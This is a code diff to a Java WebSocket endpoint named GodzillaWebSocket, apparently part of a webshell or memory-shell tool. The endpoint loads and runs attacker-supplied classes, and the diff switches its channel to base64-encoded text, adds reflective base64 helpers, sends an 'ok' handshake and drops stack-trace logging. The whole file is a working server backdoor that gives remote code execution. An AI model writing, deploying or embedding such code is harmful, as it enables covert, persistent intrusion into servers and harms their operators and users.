@@ -9,13 +9,12 @@ import javax.websocket.Session;
 import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
-import java.nio.ByteBuffer;
 
 /**
  * @author ReaJason
  * @since 2025/5/9
  */
-public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<ByteBuffer> {
+public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<String> {
     public static String key;
 
     private Session session;
@@ -45,28 +44,64 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
     }
 
     @Override
-    public void onMessage(ByteBuffer byteBuffer) {
+    public void onMessage(String message) {
         try {
-            byte[] data = byteBuffer.array();
+            byte[] data = base64Decode(message);
             data = x(data, false);
-            byte[] response = new byte[0];
             if (payload == null) {
                 payload = Q(data);
+                session.getBasicRemote().sendText(base64Encode(x("ok".getBytes(), true)));
             } else {
                 java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                 Object obj = payload.newInstance();
                 obj.equals(data);
                 obj.equals(bos);
                 obj.toString();
-                response = bos.toByteArray();
+                session.getBasicRemote().sendText(base64Encode(x(bos.toByteArray(), true)));
             }
-            session.getBasicRemote().sendBinary(ByteBuffer.wrap(x(response, true)));
         } catch (Throwable e) {
-            e.printStackTrace();
             try {
                 session.close();
             } catch (java.io.IOException ignored) {
             }
         }
+    }
+
+    @SuppressWarnings("all")
+    public static String base64Encode(byte[] bs) throws Exception {
+        String value = null;
+        Class<?> base64;
+        try {
+            base64 = Class.forName("java.util.Base64", true, Thread.currentThread().getContextClassLoader());
+            Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
+            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
+        } catch (Exception var6) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Encoder", true, Thread.currentThread().getContextClassLoader());
+                Object encoder = base64.newInstance();
+                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
+            } catch (Exception ignored) {
+            }
+        }
+        return value;
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] base64Decode(String bs) {
+        byte[] value = null;
+        Class<?> base64;
+        try {
+            base64 = Class.forName("java.util.Base64", false, Thread.currentThread().getContextClassLoader());
+            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
+            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
+        } catch (Exception var6) {
+            try {
+                base64 = Class.forName("sun.misc.BASE64Decoder", false, Thread.currentThread().getContextClassLoader());
+                Object decoder = base64.newInstance();
+                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
+            } catch (Exception ignored) {
+            }
+        }
+        return value;
     }
 }
